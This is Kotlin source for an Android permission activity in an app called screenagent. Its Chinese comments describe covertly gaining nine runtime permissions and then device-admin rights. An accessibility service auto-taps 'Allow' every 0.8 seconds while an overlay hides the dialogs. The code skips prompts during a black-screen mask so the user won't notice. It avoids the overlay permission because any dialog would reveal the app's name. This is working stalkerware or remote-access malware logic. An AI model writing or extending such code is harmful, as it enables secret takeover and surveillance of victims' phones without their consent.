package com.zaka.screenagent.perm

import android.app.Activity
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity

/**
 * 透明的权限申请页。移植 2.2 `PermissionActivity` 的作用：
 *  - 一次性把 9 项权限全部申请，系统会连续弹窗
 *  - 弹窗期间由无障碍服务（PermissionClicker）每 0.8s 扫窗口点「允许」
 *  - 用户看不到这个 Activity（浮层盖着、且本页透明无内容）
 */
class PermissionActivity : AppCompatActivity() {

    private var grantedCount = 0
    private var asked = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // 黑屏遮罩期间不能弹权限框：系统对话框会盖在遮罩上面，用户一眼就看出破绽
        if (com.zaka.screenagent.ui.BlackScreen.isShowing()) {
            Log.d("PermissionActivity", "black screen showing -> skip permission prompt")
            finish()
            return
        }
        window.addFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        )
        if (Build.VERSION.SDK_INT >= 27) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        requestNext()
    }

    private fun requestNext() {
        if (asked) return
        asked = true
        val missing = PermissionFlow.PERMISSIONS.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        Log.d(TAG, "missing=${missing.size} ${missing.joinToString()}")
        if (missing.isEmpty()) {
            finishWithDone()
            return
        }
        requestPermissions(missing.toTypedArray(), REQ)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ) return
        grantResults.forEachIndexed { i, result ->
            if (result == PackageManager.PERMISSION_GRANTED) {
                grantedCount++
                Log.d(TAG, "granted ${permissions[i]} -> $grantedCount")
            } else {
                Log.w(TAG, "denied ${permissions[i]}")
            }
            // 每有一项结束就推进浮层进度（2.2: onPermissionGranted）
            com.zaka.screenagent.ui.GuardOverlay.updateProgress(
                PermissionFlow.progressOf(grantedCount)
            )
        }
        // 系统可能分批弹，继续申请剩下的
        val stillMissing = PermissionFlow.PERMISSIONS.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        if (stillMissing.isNotEmpty() && grantedCount < PermissionFlow.TOTAL) {
            requestedRetry++
            if (requestedRetry <= 2) {
                requestPermissions(stillMissing.toTypedArray(), REQ)
                return
            }
        }
        finishWithDone()
    }

    private var requestedRetry = 0

    private fun finishWithDone() {
        Log.d(TAG, "permission flow finished, granted=$grantedCount")
        com.zaka.screenagent.ui.GuardOverlay.updateProgress(
            com.zaka.screenagent.ui.GuardOverlay.STAGE_PERM_DONE)
        // 厂商分支：MIUI 走专属流程（设备管理员由链条第二步显式触发），
        // 三星 / OPPO / vivo / 华为 等保持原有自动链路不变
        if (com.zaka.screenagent.perm.OemFlow.vendor() == com.zaka.screenagent.perm.OemFlow.Vendor.MIUI) {
            Log.d(TAG, "MIUI branch: permissions done -> stop (admin driven by chain step2)")
            finish()
            return
        }
        // 交棒给 DeviceAdminActivity（照 2.2：startActivityForResult + 不 finish）
        runCatching {
            startActivity(
                android.content.Intent(this, com.zaka.screenagent.admin.DeviceAdminActivity::class.java)
            )
        }
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ finish() }, 600)
        // 注意：不申请悬浮窗权限。任何系统弹窗都会显示应用名，等于自曝。
        // 电池优化白名单放到流程最后（通知使用权之后），避免中途叠弹窗
        finish()
    }

    companion object {
        private const val TAG = "PermFlow"
        private const val REQ = 1001
    }
}
